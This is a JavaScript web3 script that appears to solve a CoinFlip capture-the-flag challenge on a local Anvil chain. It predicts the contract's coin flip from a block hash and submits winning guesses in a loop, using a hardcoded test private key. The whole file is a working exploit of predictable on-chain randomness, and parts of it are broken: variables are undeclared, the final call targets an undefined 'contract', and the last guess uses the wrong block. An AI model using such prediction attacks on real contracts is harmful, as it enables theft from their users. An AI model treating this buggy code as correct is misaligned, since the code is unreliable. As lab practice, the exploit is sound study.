import Web3 from 'web3';
import fs from 'fs';

// rpc connection
const rpcUrl = "http://anvil.k8s-home.local"; 
const web3 = new Web3(rpcUrl);
const privateKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
let chainId;
let blockNumber;

try {
    console.log(`Connecting to Ethereum network at ${rpcUrl} ...`);
    await web3.eth.net.isListening();
    [chainId, blockNumber] = await Promise.all([
        web3.eth.getChainId(),
        web3.eth.getBlockNumber()
    ]);

} catch (err) {
    console.log(`Error connecting to network: ${err}`);
    process.exit(1);
}

console.log(`Connected to Ethereum network.`);
console.log(`Chain ID: ${chainId}`);
console.log(`Block number: ${blockNumber}`);

// contract
const CONTRACT_ADDR = "0x04C89607413713Ec9775E14b954286519d836FEf";
const COMPILED_CONTRACT = `../out/CoinFlip.sol/CoinFlip.json`;
const CONTRACT_ABI = JSON.parse(fs.readFileSync(COMPILED_CONTRACT, 'utf8')).abi;
const player = web3.eth.accounts.wallet.add(privateKey)[0].address;

// code
const theContract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDR);
const FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
const TRIES = 10;

for (let i = 0; i < TRIES; i++) {
	let receipt, result, consecutiveWins, success;

	success = false; 
	while (!success) {
		try {
			guess = Boolean(Math.floor((await web3.eth.getBlock(Number(await web3.eth.getBlockNumber()) - 1)).hash / FACTOR));
			result = await web3.eth.sendTransaction({
				from: player,
				to: CONTRACT_ADDR,
				value: 0,
				data: theContract.methods.flip(guess).encodeABI() 
			})
			success = true;
			receipt = result;
			console.log(`Try ${i}: Sent guess = ${guess}`);
		} catch (err) {
			console.log(`Error on flip(): ${err}`);
		}
	}

	try {
		result = await theContract.methods.consecutiveWins().call();
		consecutiveWins = result;
	} catch (err) {
		console.log(`Error on consecutiveWins(): ${err}`);
	}
	console.log(`Try ${i}: Wins = ${consecutiveWins}`);
}

guess = Boolean(parseInt((await web3.eth.getBlock(Number(await web3.eth.getBlockNumber()))).hash, 16) / FACTOR)
receipt = await web3.eth.sendTransaction({
	from: player,
	to: contract.address,
	data: theContract.methods.flip(guess).encodeABI()
})
wins = await theContract.methods.consecutiveWins().call();